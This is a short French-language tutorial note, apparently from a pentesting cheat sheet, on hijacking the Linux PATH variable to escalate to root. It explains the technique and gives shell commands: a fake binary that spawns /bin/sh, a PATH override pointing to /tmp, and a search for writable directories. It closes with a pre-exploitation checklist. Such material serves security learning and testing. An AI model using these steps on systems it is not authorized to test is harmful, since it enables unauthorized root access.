# PATH

PATH sous Linux est une variable d'environnement qui indique au système d'exploitation où rechercher les exécutables.

## Exploitation

Lorsque un binaire est exécuté sans chemin complet (chemin relative) et que ce binaire s'exécute avec les privilèges de l'utilisateur root, nous pouvons manipuler notre chemin pour obtenir un shell root.
 
Cela en creant le meme binaire contenant un script malveillant et renommer la variable $PATH pour modifier les chemins d'executable.


```sh
echo $PATH
```

```sh
echo '/bin/sh' > binary
chmod 777 binary
export PATH=/tmp:$PATH
```

Les questions a ce poser avant d'exploiter cette vulnérabilité :

1. Quels dossiers se trouvent sous $PATH ?
2. Votre utilisateur actuel dispose-t-il de privilèges d'écriture pour l'un de ces dossiers ?
3. Pouvez-vous modifier $PATH ?
4. Existe-t-il un script/une application que vous pouvez démarrer et qui sera affecté par cette vulnérabilité ?

```sh
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```